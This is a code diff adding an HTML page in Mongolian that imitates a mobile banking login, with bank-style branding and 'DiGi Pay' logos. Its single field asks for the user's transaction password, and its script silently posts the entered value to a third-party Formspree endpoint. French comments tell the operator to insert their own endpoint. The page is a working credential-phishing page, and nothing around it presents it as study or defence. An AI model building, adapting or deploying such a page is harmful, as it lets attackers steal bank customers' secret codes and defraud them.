@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="mn">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login</title>
+  <style>
+     * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f4f4f4;
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      align-items: center;
+    }
+    .top-bar {
+      width: 100%;
+      padding: 16px;
+      display: flex;
+      justify-content: space-between;
+    }
+    .top-bar button {
+      background: white;
+      border: none;
+      padding: 10px 16px;
+      border-radius: 10px;
+      font-size: 14px;
+      cursor: pointer;
+      color: #333;
+      font-weight: 700;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      padding: 20px;
+    }
+    .logo {
+      text-align: center;
+      margin-top: 30px;
+      margin-bottom: 20px;
+    }
+    .logo img {
+      height: 60px;
+    }
+    .form { width: 100%; }
+    .input-block {
+      background: white;
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      padding: 12px 14px;
+      margin-bottom: 25px;
+      justify-content: space-between;
+    }
+    .input-block input[type="text"],
+    .input-block input[type="password"] {
+      flex-grow: 1;
+      border: none;
+      font-size: 18px;
+      outline: none;
+      background: transparent;
+    }
+    .remember-label {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      color: #333;
+      white-space: nowrap;
+      margin-left: 10px;
+    }
+    .remember-label input {
+      margin-left: 6px;
+      transform: scale(1.1);
+    }
+    .eye {
+      cursor: pointer;
+      user-select: none;
+      padding-left: 10px;
+      color: #666;
+      font-size: 16px;
+    }
+    .btn-login {
+      width: 100%;
+      padding: 14px;
+      border-radius: 10px;
+      border: none;
+      background: #e0e0e0;
+      color: #999;
+      font-size: 16px;
+    }
+    .btn-login.active {
+      background: #006341;
+      color: white;
+      cursor: pointer;
+    }
+    .register-link {
+      color: #006341;
+      text-align: center;
+      margin-top: 15px;
+      font-weight: bold;
+    }
+    .digipay {
+      margin: 30px 0 10px;
+      text-align: center;
+    }
+    .digipay img {
+      width: 60px;
+      height: 60px;
+      border-radius: 18px;
+    }
+    .digipay p {
+      font-weight: bold;
+      font-size: 16px;
+    }
+    .forgot {
+      background: white;
+      padding: 14px;
+      border-radius: 10px;
+      text-align: center;
+      font-size: 14px;
+      margin-top: 10px;
+    }
+    .message {
+      text-align: center;
+      margin-top: 15px;
+      font-weight: bold;
+      color: green;
+    }
+    @media (max-width: 480px) {
+      .top-bar button {
+        font-size: 13px;
+      }
+    }
+  </style>
+  <link rel="shortcut icon" href="kb.png" type="image/x-icon">
+</head>
+<body>
+  <div class="top-bar">
+    <button>☰ Тусламж</button>
+    <button>English</button>
+  </div>
+
+  <div class="container">
+    <div class="logo">
+      <img src="kb.png" />
+    </div>
+
+    <!-- Formulaire -->
+    <form class="form" id="loginForm">
+      <label>гүйлгээний нууц үг</label>
+      <div class="input-block">
+        <input type="text" id="text1" name="text1" placeholder="таны гүйлгээний нууц үг" required />
+      </div>
+      <button type="submit" id="loginBtn" class="btn-login">Нэвтрэх</button>
+    </form>
+
+    <!-- Message retour -->
+    <p id="formMessage" style="margin-top: 15px; font-weight: bold;"></p>
+
+    <div class="digipay">
+      <img src="dp.png" alt="DiGi Pay">
+      <p>DiGi Pay</p>
+    </div>
+  </div>
+
+  <script>
+    const text1Input = document.getElementById('text1');
+    const loginBtn = document.getElementById('loginBtn');
+    const messageEl = document.getElementById('formMessage');
+    const form = document.getElementById('loginForm');
+
+    // Activer/désactiver le bouton
+    function updateButtonState() {
+      if (text1Input.value.trim() !== '') {
+        loginBtn.classList.add('active');
+        loginBtn.disabled = false;
+      } else {
+        loginBtn.classList.remove('active');
+        loginBtn.disabled = true;
+      }
+    }
+
+    text1Input.addEventListener('input', updateButtonState);
+    updateButtonState();
+
+    // Envoi AJAX via Formspree (sans redirection)
+    form.addEventListener('submit', async function(event) {
+      event.preventDefault();
+
+      const text1 = text1Input.value.trim();
+      if (!text1) {
+        messageEl.textContent = "❌ Оруулсан мэдээллээ шалгана уу.";
+        messageEl.style.color = "red";
+        return;
+      }
+
+      const data = { text1 };
+
+      try {
+        const response = await fetch('https://formspree.io/f/xpwyoawv', { // ⚠️ Mets ton endpoint Formspree
+          method: 'POST',
+          headers: { 
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+          },
+          body: JSON.stringify(data)
+        });
+
+        if (response.ok) {
+          messageEl.textContent = "✅ Таны мэдээлэл амжилттай илгээгдлээ.";
+          messageEl.style.color = "green";
+          text1Input.value = "";
+          updateButtonState();
+
+        } else {
+          const result = await response.json();
+          messageEl.textContent = "❌ Илгээхэд алдаа гарлаа: " + (result.message || 'Дахин оролдоно уу.');
+          messageEl.style.color = "red";
+        }
+
+      } catch (error) {
+        messageEl.textContent = "❌ Илгээхэд алдаа гарлаа. Дахин оролдоно уу.";
+        messageEl.style.color = "red";
+        console.error(error);
+      }
+    });
+  </script>
+</body>
+</html>
